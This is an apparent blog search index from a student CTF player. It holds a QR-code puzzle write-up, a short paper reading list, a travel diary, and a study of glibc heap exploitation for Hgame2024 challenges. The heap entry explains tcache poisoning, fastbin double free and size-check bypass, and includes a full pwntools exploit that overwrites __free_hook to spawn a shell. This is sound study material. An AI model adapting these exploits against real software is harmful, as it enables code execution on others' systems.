<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2024矩阵杯 Misc 两级反转</title>
    <url>/2024/06/19/2024%E7%9F%A9%E9%98%B5%E6%9D%AFwp-%E4%B8%A4%E7%BA%A7%E5%8F%8D%E8%BD%AC/</url>
    <content><![CDATA[<p>｡:.ﾟヽ(*´∀&#96;)ﾉﾟ.:｡</p>
<h2 id="两级反转"><a href="#两级反转" class="headerlink" title="两级反转"></a>两级反转</h2><p>两极反转，黑白不分<br>奇变偶不变，横变竖不变<br>(PS:或许你要非常熟悉二维码的结构  </p>
<h3 id="write-up"><a href="#write-up" class="headerlink" title="write up"></a>write up</h3><p>光看提示大概可以猜到是奇数的横行颜色黑白反转了<br>但是有个问题是index是从0还是1开始计数呢？都很合理啊<br>而且位置探测的三个方块很明显是正确的，那就是处理图像是要跳过这些正确的部分（？</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.githubusercontent.com/Z1naX5/PicGo/master/images/0.png"
                      alt="0"
                ></p>
<p>没关系，还有一条PS：让我熟悉二维码结构</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.githubusercontent.com/Z1naX5/PicGo/master/images/img.png"
                      alt="img"
                ></p>
<p>对照一下我们的图片，初见端倪啊。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.githubusercontent.com/Z1naX5/PicGo/master/images/img_1.png"
                      alt="img_1"
                ></p>
<p>红框一列的地方黑白是固定的，奇偶的问题解决了；<br>图像处理的范围其实不能完全确定，不是整张图是肯定的，但具体一定要多少呢？其实没有足够明确的证据来佐证<br>但是没关系，二维码图形本身有很好的反混淆，我们既是没有完全复原依旧可以尝试能不能读出信息</p>
<p>先复原红框的部分<br>拿上次的RCTF脚本略略修改一下</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import cv2</span><br><span class="line"></span><br><span class="line">def split4db(img, offset_x=1, offset_y=1, flag=0):</span><br><span class="line">    # 跳过外围白边</span><br><span class="line">    img = img[offset_y:, offset_x:]</span><br><span class="line">    p = 0</span><br><span class="line"></span><br><span class="line">    # 先切x</span><br><span class="line">    for i in range(29):</span><br><span class="line">        p += 25</span><br><span class="line">        if i&lt;7 or i&gt;21:</span><br><span class="line">            continue</span><br><span class="line">        else:</span><br><span class="line">            if i%2==0:</span><br><span class="line">                img[p-25:p+1,:]=cv2.bitwise_not(img[p-25:p+1,:])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    return img</span><br><span class="line"></span><br><span class="line">img=cv2.imread(&quot;8E2A248B-0EE8-42b2-B19B-C6A9CE0D47F8.png&quot;)</span><br><span class="line">img=split4db(img)</span><br><span class="line">cv2.imwrite(&#x27;new0.png&#x27;, img)</span><br></pre></td></tr></table></figure></div>
<p>结果：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.githubusercontent.com/Z1naX5/PicGo/master/images/new0.png"
                      alt="new0"
                ><br>扫一下，出了。</p>
<h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><h4 id="有关为什么这个结果这么丑陋："><a href="#有关为什么这个结果这么丑陋：" class="headerlink" title="有关为什么这个结果这么丑陋："></a>有关为什么这个结果这么丑陋：</h4><p>实际上，这张二维码的图片如果拖进画图等可以数像素的软件里人力分析一下，很容易发现，它是25像素对齐的，也就是一个黑点或白点理论上是25*25像素。<br>然而，黑色并不完全遵循这个25对齐，只有当有另一个黑点和它接壤时，他才会在连接处满足25个像素对齐，否则就是24个黑色像素加上一行或一列多余的白色像素。<br>一开始我的确想要处理掉这些像素，方案为统统改为24像素对齐，但是写到一半的时候考虑到<strong>二维码有很好的反混淆性</strong>，说实话1对于24来说就是一个很小的噪声，所以就忽略不计了，把最外围的1像素白边切掉后直接处理图像就ok了。</p>
<h4 id="有关二维码有很好的反混淆性："><a href="#有关二维码有很好的反混淆性：" class="headerlink" title="有关二维码有很好的反混淆性："></a>有关二维码有很好的反混淆性：</h4><p>这实际上是一个很有意思的知识，二维码是有自己的版本以及纠错级别的，每个二维码出生的时候就被选择了能承载多少的什么形式的信息，但是具体的就不说了，网上有非常多讲这块讲的很清楚的。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.githubusercontent.com/Z1naX5/PicGo/master/images/img_2.png"
                      alt="img_2"
                ><br>可以看到，如果我想要容纳更多的噪声（纠错能力变强），那么能够实际留存的有效信息越少，很符合直觉。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.githubusercontent.com/Z1naX5/PicGo/master/images/img_3.png"
                      alt="img_3"
                ></p>
]]></content>
      <tags>
        <tag>wp</tag>
        <tag>Misc</tag>
        <tag>CV</tag>
      </tags>
  </entry>
  <entry>
    <title>视觉、深度学习相关论文分享</title>
    <url>/2024/04/11/AI-2.0-01/</url>
    <content><![CDATA[<p><em>φ</em>(．．)</p>
<ol>
<li>Attention Is All You Need|2017</li>
<li>An image is worth 16 x 16 words:transformers for image recognition at scale|2021|ICLR</li>
<li>Masked Autoencoders Are Scalable Vision Learners|2022|CVPR</li>
</ol>
<blockquote>
<p>更新：对于第一篇paper，你可能需要清楚什么是<code>Attention</code>,<code>encoder-decoder</code>,以及一些深度学习的基础知识。这样你会更快了解什么是<code>transformer</code><br>第二篇,你可能需要清楚什么是<code>patch</code>,<code>CNN</code>,以及一些CV的基础知识，他的成果基于<code>transformer</code>,所以也请大致知道<code>transformer</code>是什么。这样你会更快了解什么是<code>VIT</code><br>第三篇，你看到了<code>VIT</code>的无限潜力，在<code>Self-Supervised Learning</code>后，对于像素这样级别很低的输出依然有惊人的表现，这得益于它的非对称<code>encoder-decoder</code>，或许图片里的信息真的太冗余了呢？  </p>
</blockquote>
]]></content>
      <tags>
        <tag>CV</tag>
        <tag>AI</tag>
        <tag>Paper Reading</tag>
      </tags>
  </entry>
  <entry>
    <title>Wandering</title>
    <url>/2024/06/22/Wandering/</url>
    <content><![CDATA[<p>(・ε・)</p>
<p>意外<del>蹭上了</del>参加了杭高院的队伍一起做一个CV有关的比赛，大家都在杭州，于是去线下讨论了一下，总要碰面的。<br>不过因为我早上在考试，其实没有和所有的学长们都见面。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.githubusercontent.com/Z1naX5/PicGo/master/images/IMG_8502.JPG?token=BDXQ3TM2VKMUZN5TSVCWRXDGO32DE"
                      alt="IMG_8502"
                ></p>
<p>然后过去了之后也没什么事，最主要和大家碰个面。知道上午的会以及大概熟悉了一下华为的这个平台（？</p>
<p>火速就结束了。下沙离科创园稍微有点远，去一趟打车都要一个小时。学长们说，带我逛逛。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.githubusercontent.com/Z1naX5/PicGo/master/images/IMG_8503.JPG?token=BDXQ3TJGZ5IECOLLEFLJH6TGO32DI"
                      alt="IMG_8503"
                ></p>
<p>于是和一个学姐一起从科创园步行到杭高院校园。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.githubusercontent.com/Z1naX5/PicGo/master/images/IMG_8505.JPG?token=BDXQ3TMWXWC4HTIYVP5CZDLGO32DQ"
                      alt="IMG_8505"
                ></p>
<p>路过了我心里很神秘又厉害的西湖大学。</p>
<p>然后再走了体感两百米，到了杭高院。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.githubusercontent.com/Z1naX5/PicGo/master/images/IMG_8509.JPG?token=BDXQ3TMVZLT3V45DBWENUW3GO32D2"
                      alt="IMG_8509"
                ></p>
<p>忘记拍大门了。</p>
<p>其实是因为手上拿着西瓜和耳机不太方便，懒得拍了。<br>校园里面也没拍，说带我逛逛，其实一到就直奔办公室休息了哈哈哈。然后在一段很长很长的聊天之后，他们说，这里没啥好逛的，一览无遗，全是一样的楼。</p>
<p>但不得不说，杭高院还是挺气派的，我是说里面的装修，外面我也没仔细瞧。</p>
<p>晚饭也是在那里吃的，因为没逛校园，但还是说好了带我逛逛，改成去学校周边逛逛（</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.githubusercontent.com/Z1naX5/PicGo/master/images/IMG_8514.JPG?token=BDXQ3TM5KK75H4P6NUHVCE3GO32D6"
                      alt="IMG_8514"
                ></p>
<p>在吃饭的地方其实也赖了好一会，大概是因为今天是难得的休息天。</p>
<p>下午的时候聊天就聊了许多有关未来打算的事，确实在研一学长们的眼里，我很年轻。而且虽然我是RT学长介绍进去的，但是实际上在今天之前，我的确和他们都很陌生。所以这样让他们更加好奇Vidar（</p>
<p>我也不知道未来怎么打算。</p>
<p>所以哪也没逛，净在凳子上聊天了，我好奇他们，他们好奇我。</p>
<p>但下沙离这真挺远的，于是准备走了的时候，他们还是问我要不要逛逛。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.githubusercontent.com/Z1naX5/PicGo/master/images/IMG_8515.JPG?token=BDXQ3TMX6QAYHC7I2V6ZZU3GO32EA"
                      alt="IMG_8515"
                ></p>
<p>但是有两位学长的回去的车已经打好了。于是在这里送别他们，留我和RT在这里再逛一会。</p>
<p>我和liunx大师聊了还挺久的，这样的机会挺难得的。和已经毕业的学长聊天，这种感觉和校园里的人聊还真挺不一样的。而且我们方向算是相似吧，获得了很多很实在的学习建议，也更加认识了协会以前的厉害的学长们。</p>
<p>今天的行程几乎完全计划外，昨天才定的今天要来，也没说要来多久。然后就在这呆了几乎一天，奇妙。总之我还是挺庆幸我没为今天下午与晚上安排什么的。</p>
<p>Wandering.</p>
]]></content>
      <tags>
        <tag>喵喵</tag>
      </tags>
  </entry>
  <entry>
    <title>heap初探 | Hgame2024 week2&amp;week3 堆部分知识分析</title>
    <url>/2024/06/21/heap%E5%88%9D%E6%8E%A2/</url>
    <content><![CDATA[<p>(っ●ω●)っ</p>
<h3 id="对堆的简单认识"><a href="#对堆的简单认识" class="headerlink" title="对堆的简单认识"></a>对堆的简单认识</h3><p>堆管理器：ptmalloc2 - glibc<br>内存分配区：arena，收发内存的地方<br>内存的单位：chunk </p>
<p> <em>malloc 一个 chunk 的结构</em></p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"></span><br><span class="line">INTERNAL_SIZE_T mchunk_prev_size; <span class="comment">//size of previous chunk (if free)</span></span><br><span class="line"></span><br><span class="line">INTERNAL_SIIZE_T mchunk_size; <span class="comment">//size in bytes,including overhead</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span> <span class="comment">//double links -- used only if free</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span> <span class="comment">/* only used for large blocks:pointer to next larger size; */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">//double links -- used only if free</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>由于64位 chunk 内存对齐 0x10 ,32位内存对齐 0x08<br>所以 size 位低三位始终为0,记录：<br><code>NON_ MIAN_ ARENA</code>,当前 chunk 是否不属于主线程，1表示不属于，0表示属于。<br><code>IS_MAPPED</code>，当前 chunk 是否是由 mmap 分配的。<br><code>PREV_INUSE</code>，前一个 chunk 块是否被分配，1表示分配，0表示未分配。</p>
<p>释放后的 chunk : bin<br><code>unsorted bin</code>:</p>
<ul>
<li>垃圾桶中的垃圾桶</li>
<li>双向链表</li>
</ul>
<p><code>fast bins</code>:</p>
<ul>
<li>0x20-0x80</li>
<li>后进先出 LIFO;单向链表(fd)</li>
</ul>
<p><code>small bins</code>:</p>
<ul>
<li>0x20-0x400</li>
</ul>
<p><code>large bins</code>:</p>
<ul>
<li>0x400-</li>
<li>双向链表</li>
</ul>
<p><code>(tcache)glibc-2.27</code>:</p>
<ul>
<li>0x20-0x410</li>
<li>进入tcache bin的 chunk 的 fd 指的是下一个 chunk 的头指针，而其他的 bin 会指向 chunk_addr,即 prev_size 的地方</li>
<li>tcache bin里的chunk不会发生合并（不取消inuse bit）</li>
<li>后进先出 LIFO;单向链表(fd)</li>
</ul>
<p>对于具体的chunk的申请释放我主要参考了，不再赘叙：</p>
<ul>
<li><a class="link"   href="https://www.cjovi.icu/pwnreview/1300.html" >chuj学长的博客 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/implementation/overview/" >ctf-wiki <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
<h3 id="week2堆题分析"><a href="#week2堆题分析" class="headerlink" title="week2堆题分析"></a>week2堆题分析</h3><p>给的漏洞都是比较明显好利用的，静态分析的部分基本上都略过了。</p>
<h4 id="Elden-Ring-II"><a href="#Elden-Ring-II" class="headerlink" title="Elden Ring II"></a>Elden Ring II</h4><p>UAF，没有对使用过的指针置0。</p>
<h5 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache_poisoning"></a>tcache_poisoning</h5><p>tcache_put:</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s room</span></span><br><span class="line"><span class="comment">   for more chunks.  */</span></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_put</span> <span class="params">(mchunkptr chunk, <span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS); <span class="comment">//glibc2.30前存在</span></span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>tcache_get:</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s</span></span><br><span class="line"><span class="comment">   available chunks to remove.  */</span></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *</span><br><span class="line"><span class="title function_">tcache_get</span> <span class="params">(<span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS); <span class="comment">//glibc2.30前存在</span></span><br><span class="line">  assert (tcache-&gt;entries[tc_idx] &gt; <span class="number">0</span>);  <span class="comment">//glibc2.30前存在</span></span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>可以看到tcache在放入和取出的时候都几乎没有校验，只要有空位置就可以放，存在可以取的chunk就可以取。</p>
<p>所以 tcache_poisoning 发生在<code>tcache_get</code>时不作任何校验把一块别的地方当作重新利用的chunk,实现任意地址写。<br>实现 tcache_poisoning 则是需要把bin中的一个fd指向希望伪造的其他地方。在这个题里是UAF  </p>
<blockquote>
<p>调试时还可以看到改完fd后tcache bin里的count还是旧的，但依然没有问题。充分说明了放入和取出的优先级高于了很多检查。在2.30之后把 <code>tcache_entry</code>的结构改了之后就没这么好利用了，所幸改个<code>count</code>或者凑个<code>count</code>也不算太难。</p>
</blockquote>
<p>下面是我的 exp</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./vuln&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./vuln&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;&gt;&quot;</span>,<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Index: &quot;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Size: &quot;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;&gt;&quot;</span>,<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Index: &quot;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;&gt;&quot;</span>,<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Index: &quot;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Content: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;&gt;&quot;</span>,<span class="string">b&quot;4&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Index: &quot;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(i,<span class="number">0x90</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x20</span>) <span class="comment">#防止合并</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">show(<span class="number">7</span>) <span class="comment">#libc泄露</span></span><br><span class="line"></span><br><span class="line">libc_base=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">0x08</span>,<span class="string">b&quot;\x00&quot;</span>))-<span class="number">0x1ecbe0</span></span><br><span class="line">success(<span class="string">&quot;libc_base = &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">system_addr = libc_base + libc.sym.system</span><br><span class="line"></span><br><span class="line"><span class="comment">#-------</span></span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x20</span>) <span class="comment">#防止合并</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line">delete(<span class="number">10</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">edit(<span class="number">10</span>,p64(free_hook)) <span class="comment">#tcache posioning</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">12</span>,<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">13</span>,<span class="number">0x60</span>)</span><br><span class="line">edit(<span class="number">13</span>,p64(system_addr)) <span class="comment">#任意地址写入system()</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">14</span>,<span class="number">0x20</span>) <span class="comment">#准备触发</span></span><br><span class="line">edit(<span class="number">14</span>,<span class="string">b&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">14</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
<p>对了这个题不允许使用用过的 index,哪怕<code>free</code>过，所以要数一下谁是谁。</p>
<h4 id="fastnote"><a href="#fastnote" class="headerlink" title="fastnote"></a>fastnote</h4><p>UAF,but null</p>
<h5 id="fastbin-double-free"><a href="#fastbin-double-free" class="headerlink" title="fastbin double free"></a>fastbin double free</h5><p><code>free</code>后指针清零，不代表我们不能控制这个指针了。 fastbin double free 就是混淆对这个指针的控制，导致一边在正常获取堆块写数据的操作在 fastbin 里也有响应，伪造一个 chunk。依旧是实现任意地址写。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Another simple check: make sure the top of the bin is not the</span></span><br><span class="line"><span class="comment">       record we are going to add (i.e., double free).  */</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line">        errstr = <span class="string">&quot;double free or corruption (fasttop)&quot;</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>fastbin 的源码里考虑了double free，但是只检查链表的后一个，且 fastbin 的堆块被释放后next_chunk 的 pre_inuse 位不会被清0。（应该是 fastbin 不会合并的机制？）<br>所以只要在<code>free</code>的中间加一个无关的 chunk,就能做到 fastbin double free 。</p>
<p>和上一题太像了，exp也没啥好贴的。</p>
<h4 id="old-fastnote"><a href="#old-fastnote" class="headerlink" title="old_fastnote"></a>old_fastnote</h4><p>UAF,but null &amp;&amp; libc-2.23  </p>
<h5 id="SIZE位检查绕过"><a href="#SIZE位检查绕过" class="headerlink" title="SIZE位检查绕过"></a>SIZE位检查绕过</h5><p>继续看到2.23 从 fastbin 里 malloc 时候的源码：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   If the size qualifies as a fastbin, first check corresponding bin.</span></span><br><span class="line"><span class="comment">   This code is safe to execute even if av is not yet initialized, so we</span></span><br><span class="line"><span class="comment">   can try it without checking, which saves some time on this fast path.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (nb) &lt;= (<span class="type">unsigned</span> <span class="type">long</span>) (get_max_fast ()))</span><br><span class="line">  &#123;</span><br><span class="line">    ...</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> (victim != <span class="number">0</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> (__builtin_expect (fastbin_index (chunksize (victim)) != idx, <span class="number">0</span>))</span><br><span class="line">          &#123;</span><br><span class="line">            errstr = <span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>;</span><br><span class="line">          errout:</span><br><span class="line">            malloc_printerr (check_action, errstr, chunk2mem (victim), av);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">          &#125;<span class="comment">//这里要求size位的大小要符合fastbin才能把bin里的东西取出来</span></span><br><span class="line">        check_remalloced_chunk (av, victim, nb);<span class="comment">//其实这一行很有意思，但是这个不用管，所以我放在最后讲（</span></span><br><span class="line">        <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">        alloc_perturb (p, bytes);</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>所以我们想要实现的任意地址写继续使用<code>__free_hook</code>就不行了，<code>__free_hook</code>上面都是0，<code>__free_hook</code>之后的地址也没啥好考虑的，因为即使符合条件也没办法覆写<code>__free_hook</code>了。</p>
<p>而<code>__malloc_hook</code>上面有一段不为空的地方可以利用,一般__malloc_hook-0x23能得到一个0x7f,满足0x20-0x80的要求。<br>所以这个题还是double free混淆一次fd，然后取的时候因为要检查size所以用__malloc_hook改写这样就可以塞进去一个能取出来的地址了。</p>
<blockquote>
<p>注意：fastbin的fd记录的是chunk_addr,然而实际数据是从chunk_addr+0x10的地方开始写的，所以取出<code>__malloc_hook-0x23</code>的时候写入数据是从<code>__malloc_hook-0x13</code>的地方开始的。</p>
</blockquote>
<h3 id="week3堆题分析"><a href="#week3堆题分析" class="headerlink" title="week3堆题分析"></a>week3堆题分析</h3><p>week3全是堆题（（，所以就是week3分析。</p>
<h4 id="Elden-Ring-III"><a href="#Elden-Ring-III" class="headerlink" title="Elden Ring III"></a>Elden Ring III</h4><p>UAF,largebin_attack，只允许申请大堆块。</p>
<h5 id="tcache-mp"><a href="#tcache-mp" class="headerlink" title="tcache mp_"></a>tcache mp_</h5><p>感觉还是得先从tcache结构讲起我才能舒服。</p>
<p>首先我们知道 tcachebin 能够放64个 bin 的链表，从0x20+0x10*63&#x3D;0x410<br>所以0x20-0x410的堆块<code>free</code>后会先来这里，否则是 unsortedbin 。</p>
<p><code>tcache_perthread_struct</code>是用来管理 tcache 链表的，这个结构体位于 heap 段的起始位置， size 大小为0x250( glibc2.30以前 )。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> TCACHE_MAX_BINS                64</span></span><br></pre></td></tr></table></figure></div>

<p>第一次 malloc 时，会先 malloc 一块内存用来存放 <code>tcache_perthread_struct</code><br>也就是调试的时候经常能够看到的第一个大堆块。（具体过程和源码实现可以看看wiki）<br>这个0x250也就是<code>tcache_perthread_struct</code>的大小<code>0x10</code>的头+<code>0x01*0x40</code>的<code>counts</code>+<code>0x08*0x40</code>的<code>entries</code></p>
<p>在之后的版本这个 chunk 的大小为 0x290&#x3D;0x250+0x40。多出来的0x40就是因为定义的时候更改了<code>counts</code>的类型。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">uint16_t</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> TCACHE_MAX_BINS                64</span></span><br></pre></td></tr></table></figure></div>

<p>而<code>tcache_entry</code>记录的就是bin的单向链表（具体的实现还是要看源码但我觉得这个还是好理解的）</p>
<p>也就是说之前利用时比较熟悉的<code>fd</code>如果是被 tcachebin 记录的话实际上位置是了如指掌的，就在 heap 的开头但是摸不到。</p>
<p>终于讲到漏洞发生了。<br>有 tcache 的版本<code>free</code>的时候优先考虑 tcache，看到要进入<code>tcache_put</code>的条件是对比 <code>mp_.tcache_bins</code>作检查而非宏定义，这就给了我们操作空间。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">_int_free (mstate av, mchunkptr p, <span class="type">int</span> have_lock)</span><br><span class="line">&#123;</span><br><span class="line">  ......</span><br><span class="line">  ......</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">size_t</span> tc_idx = csize2tidx (size);</span><br><span class="line">    <span class="keyword">if</span> (tcache</span><br><span class="line">        &amp;&amp; tc_idx &lt; mp_.tcache_bins <span class="comment">// 64</span></span><br><span class="line">        &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count) <span class="comment">// 7</span></span><br><span class="line">      &#123;</span><br><span class="line">        tcache_put (p, tc_idx);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  ......</span><br><span class="line">  ......</span><br></pre></td></tr></table></figure></div>
<p><code>tcache_put</code>的内容之前看过，几乎没有检查的检查。里面有关<code>TCACHE_MAX_BINS</code>的 assert 也在glibc2.30后删去了，就以本题2.33的版本而言，下面的利用思路是可行的。</p>
<p>现在我们希望摸一下 tcache bin 就变成一件可能的事，把<code>mp_.tcache_bins </code>变大，那么就能够让超过0x400的 chunk 来到 tcache bin 而不是 unsorted bin 。<br>根据刚刚看到的结构，这个不该挤进来的 chunk 的<code>entry</code>还会被挤到后面的 chunk 的内存里。</p>
<p>这个后面的 chunk 要是可编辑，那就终于可以实现我们想要的任意地址写了。不过还是得看看这个改完的地址能不能取。</p>
